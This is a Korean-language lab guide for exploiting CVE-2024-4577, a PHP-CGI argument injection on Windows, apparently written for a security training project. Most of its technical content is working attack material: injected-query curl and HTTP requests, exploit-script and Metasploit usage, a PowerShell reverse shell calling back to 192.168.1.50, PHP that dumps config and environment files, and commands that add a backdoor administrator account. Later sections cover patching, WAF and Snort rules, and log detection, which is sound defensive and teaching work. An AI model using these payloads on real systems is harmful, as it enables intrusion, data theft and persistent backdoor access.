# CVE-2024-4577 구현 가이드
## PHP-CGI Argument Injection → RCE

---

## 📋 목차
1. [취약점 개요](#취약점-개요)
2. [환경 요구사항](#환경-요구사항)
3. [설치 및 구성](#설치-및-구성)
4. [취약점 원리](#취약점-원리)
5. [공격 시연](#공격-시연)
6. [방어 방법](#방어-방법)

---

## 🎯 취약점 개요

### CVE-2024-4577 정보
- **CVE ID**: CVE-2024-4577
- **발견일**: 2024년 6월 6일
- **CVSS 점수**: 9.8 (Critical)
- **발견자**: Orange Tsai (DEVCORE)
- **영향**: Remote Code Execution (RCE)

### 취약점 유형
- PHP-CGI Argument Injection
- Unicode Character Encoding Bypass
- Windows Best-Fit Character 변환 악용

### 영향받는 버전
```
PHP 8.3.0 ~ 8.3.7   → 패치: 8.3.8
PHP 8.2.0 ~ 8.2.19  → 패치: 8.2.20
PHP 8.1.0 ~ 8.1.28  → 패치: 8.1.29
```

---

## 💻 환경 요구사항

### 필수 조건
1. **운영체제**: Windows Server 2019 (또는 Windows 10/11)
2. **웹서버**: Apache 2.4+
3. **PHP**: 8.1.0 ~ 8.1.28 (취약 버전)
4. **PHP 실행 모드**: **PHP-CGI** (필수!)

### 중요 사항
⚠️ **Apache + mod_php 구성에서는 동작하지 않습니다!**
✅ **반드시 PHP-CGI 모드로 설정해야 합니다.**

---

## 🔧 설치 및 구성

### 1단계: PHP-CGI 설치

#### Option A: XAMPP 사용 (권장)
```powershell
# 1. XAMPP 다운로드 및 설치
https://www.apachefriends.org/download.html

# 2. PHP 버전 확인 (취약 버전인지 체크)
C:\xampp\php\php.exe --version

# 3. PHP-CGI 모드 확인
C:\xampp\php\php-cgi.exe --version
```

#### Option B: 수동 설치
```powershell
# 1. PHP 8.1.28 다운로드
https://windows.php.net/downloads/releases/archives/

# 2. C:\php에 압축 해제

# 3. php.ini 설정
cp C:\php\php.ini-development C:\php\php.ini

# 4. php.ini 수정
cgi.force_redirect = 0
cgi.fix_pathinfo = 1
```

### 2단계: Apache CGI 설정

#### httpd.conf 수정
```apache
# C:\xampp\apache\conf\httpd.conf

# CGI 모듈 활성화
LoadModule cgi_module modules/mod_cgi.so
LoadModule actions_module modules/mod_actions.so

# PHP-CGI 핸들러 설정
ScriptAlias /php-cgi "C:/xampp/php/php-cgi.exe"
Action application/x-httpd-php "/php-cgi"
AddHandler application/x-httpd-php .php

# CGI 실행 권한
<Directory "C:/xampp/htdocs">
    Options +ExecCGI
    AllowOverride All
</Directory>
```

### 3단계: 프로젝트 파일 배치

```powershell
# 웹 루트로 프로젝트 복사
xcopy "C:\Users\User\Documents\GitHub\HyundaiAutoever_ITsecurity_project4\1x_inv\website" "C:\xampp\htdocs\1x_inv" /E /I /Y

# Apache 재시작
C:\xampp\apache_restart.bat
```

### 4단계: 설정 확인

브라우저에서 접속:
```
http://localhost/1x_inv/vulnerable_cgi.php?debug=1
```

**확인 사항**:
- Server API: **CGI/FastCGI** (mod_php가 아니어야 함!)
- PHP Version: 8.1.x ~ 8.2.19
- OS: Windows

---

## 🔍 취약점 원리

### 1. Windows Best-Fit Character 변환

Windows는 특정 로케일에서 "Best-Fit" 문자 매핑을 수행합니다:

```
0xAD (Soft Hyphen) → 0x2D (Hyphen '-')
```

### 2. CVE-2012-1823 우회

#### 과거 (CVE-2012-1823)
```php
// PHP는 쿼리스트링에서 '-'를 차단했음
?-d allow_url_include=1  ❌ BLOCKED
```

#### 현재 (CVE-2024-4577)
```php
// Soft Hyphen(0xAD)을 사용하면 우회 가능
?%ADd allow_url_include=1  ✅ BYPASSED!

// Windows가 자동으로 변환
%AD → -

// 최종적으로 PHP-CGI에 전달되는 것
-d allow_url_include=1
```

### 3. 공격 흐름

```
┌─────────────────┐
│ 1. 공격자가 요청 │
│   %AD 포함       │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ 2. Windows 변환  │
│   %AD → -        │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ 3. PHP-CGI 해석  │
│   -d flag 인식   │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ 4. 설정 변경     │
│   allow_url_*=1  │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ 5. 코드 실행     │
│   php://input    │
└─────────────────┘
```

### 4. 핵심 Exploit 구성요소

```
vulnerable_cgi.php?lang=en%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input

분석:
├─ %AD           : Soft Hyphen (Windows가 '-'로 변환)
├─ d             : 'd'와 결합되어 '-d' 플래그 생성
├─ allow_url_include%3d1  : URL include 활성화 (%3d = '=')
├─ +-d+          : 추가 -d 플래그
└─ auto_prepend_file%3dphp://input : POST 데이터를 PHP로 실행

POST Body:
<?php system('whoami'); ?>
```

---

## 🚀 공격 시연

### 방법 1: Python Exploit Script 사용

```bash
# 의존성 설치
pip install requests colorama

# 취약점 확인
python exploit_cve_2024_4577.py -t http://localhost/1x_inv/vulnerable_cgi.php --check

# 단일 명령 실행
python exploit_cve_2024_4577.py -t http://localhost/1x_inv/vulnerable_cgi.php -c "system('whoami');"

# 대화형 쉘
python exploit_cve_2024_4577.py -t http://localhost/1x_inv/vulnerable_cgi.php --shell

# 파일 읽기
python exploit_cve_2024_4577.py -t http://localhost/1x_inv/vulnerable_cgi.php --read "C:\\Windows\\System32\\drivers\\etc\\hosts"

# 웹쉘 업로드
python exploit_cve_2024_4577.py -t http://localhost/1x_inv/vulnerable_cgi.php --upload
```

### 방법 2: cURL 사용 (수동)

#### 테스트 1: phpinfo() 실행
```bash
curl -X POST "http://localhost/1x_inv/vulnerable_cgi.php?lang=en%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" -d "<?php phpinfo(); ?>"
```

#### 테스트 2: 시스템 명령 실행
```bash
curl -X POST "http://localhost/1x_inv/vulnerable_cgi.php?lang=en%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" -d "<?php system('whoami'); ?>"
```

#### 테스트 3: 파일 시스템 접근
```bash
curl -X POST "http://localhost/1x_inv/vulnerable_cgi.php?lang=en%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" -d "<?php echo file_get_contents('C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts'); ?>"
```

### 방법 3: Burp Suite / OWASP ZAP

```http
POST /1x_inv/vulnerable_cgi.php?lang=en%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

<?php system('ipconfig'); ?>
```

### 방법 4: Metasploit (고급)

```bash
# Metasploit Framework
use exploit/windows/http/php_cgi_arg_injection
set RHOSTS 192.168.1.100
set TARGETURI /1x_inv/vulnerable_cgi.php
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit
```

---

## 🔬 고급 Payload 예제

### 1. Reverse Shell (Windows)

```powershell
# PowerShell Reverse Shell
$payload = @"
<?php
\$client = new-object System.Net.Sockets.TcpClient('192.168.1.50',4444);
\$stream = \$client.GetStream();
[byte[]]\$bytes = 0..65535|%{0};
while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){
    \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);
    \$sendback = (iex \$data 2>&1 | Out-String );
    \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';
    \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);
    \$stream.Write(\$sendbyte,0,\$sendbyte.Length);
    \$stream.Flush()
};
\$client.Close()
?>
"@

# 리스너 시작 (공격자 머신)
nc -lvnp 4444

# Payload 전송
curl -X POST "http://target/vulnerable_cgi.php?lang=en%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" -d $payload
```

### 2. 데이터 탈취

```php
<?php
// 데이터베이스 설정 파일 읽기
$config = file_get_contents('../api/config.php');
file_put_contents('C:\\xampp\\htdocs\\stolen_config.txt', $config);

// 환경 변수 탈취
$env = print_r($_ENV, true);
file_put_contents('C:\\xampp\\htdocs\\stolen_env.txt', $env);
?>
```

### 3. 권한 상승

```php
<?php
// 새로운 관리자 계정 생성 (Windows)
system('net user hacker P@ssw0rd123! /add');
system('net localgroup administrators hacker /add');

// SSH 활성화 (Windows Server)
system('powershell Add-WindowsCapability -Online -Name OpenSSH.Server');
system('powershell Start-Service sshd');
?>
```

---

## 🛡️ 방어 방법

### 1. 즉시 조치 (긴급)

```bash
# PHP 업그레이드
- PHP 8.3.8 이상
- PHP 8.2.20 이상
- PHP 8.1.29 이상
```

### 2. Apache 설정 변경

```apache
# .htaccess에 추가
<IfModule mod_rewrite.c>
    RewriteEngine On

    # Soft Hyphen(0xAD) 차단
    RewriteCond %{QUERY_STRING} %AD [NC,OR]
    RewriteCond %{QUERY_STRING} \xAD [NC]
    RewriteRule .* - [F,L]
</IfModule>
```

### 3. WAF 규칙

```
# ModSecurity 규칙
SecRule QUERY_STRING "@contains %ad" \
    "id:2024001,\
    phase:1,\
    deny,\
    status:403,\
    msg:'CVE-2024-4577 Attempt Detected'"
```

### 4. PHP 설정 강화

```ini
; php.ini
cgi.force_redirect = 1
cgi.fix_pathinfo = 0
allow_url_include = Off
allow_url_fopen = Off
disable_functions = system,exec,shell_exec,passthru,popen,proc_open
open_basedir = /var/www/html
```

### 5. mod_php로 전환 (권장)

```apache
# CGI 대신 mod_php 사용
LoadModule php_module modules/libphp.so
<FilesMatch \.php$>
    SetHandler application/x-httpd-php
</FilesMatch>
```

---

## 📊 탐지 방법

### 1. 로그 분석

```bash
# Apache Access Log
grep "%AD" /var/log/apache2/access.log
grep "auto_prepend_file" /var/log/apache2/access.log
grep "allow_url_include" /var/log/apache2/access.log
```

### 2. IDS/IPS 시그니처

```
# Snort Rule
alert tcp any any -> any 80 (
    msg:"CVE-2024-4577 PHP-CGI Argument Injection Attempt";
    content:"%AD";
    http_uri;
    content:"allow_url_include";
    http_uri;
    sid:2024001;
    rev:1;
)
```

### 3. SIEM 쿼리 (Splunk)

```spl
index=web_logs
| search uri="*%AD*" OR uri="*auto_prepend_file*"
| stats count by src_ip, uri
| where count > 5
```

---

## 🎓 학습 목표 달성 체크리스트

- [ ] CVE-2024-4577 취약점 원리 이해
- [ ] Windows Best-Fit 문자 변환 이해
- [ ] PHP-CGI vs mod_php 차이점 파악
- [ ] 실제 환경에서 exploit 성공
- [ ] Reverse shell 획득 경험
- [ ] 방어 기법 구현 및 테스트
- [ ] 로그 분석 및 탐지 방법 학습

---

## 📚 참고 자료

1. **공식 CVE**: https://nvd.nist.gov/vuln/detail/CVE-2024-4577
2. **DEVCORE 분석**: https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability/
3. **PoC GitHub**: https://github.com/watchtowrlabs/CVE-2024-4577
4. **PHP 패치**: https://www.php.net/ChangeLog-8.php

---

## ⚠️ 법적 고지

이 자료는 **교육 및 보안 연구 목적**으로만 사용되어야 합니다.

- 승인되지 않은 시스템에 대한 공격은 불법입니다
- 본인 소유 또는 명시적 허가를 받은 시스템에서만 테스트하세요
- 무단 침입 시 형사 처벌 대상이 될 수 있습니다

**테스트 환경**: 격리된 실습 네트워크에서만 진행하세요!

---

## 📞 문의

기술 지원: security-team@1xinv.com
프로젝트: https://github.com/Ggoon23/HyundaiAutoever_ITsecurity_project4
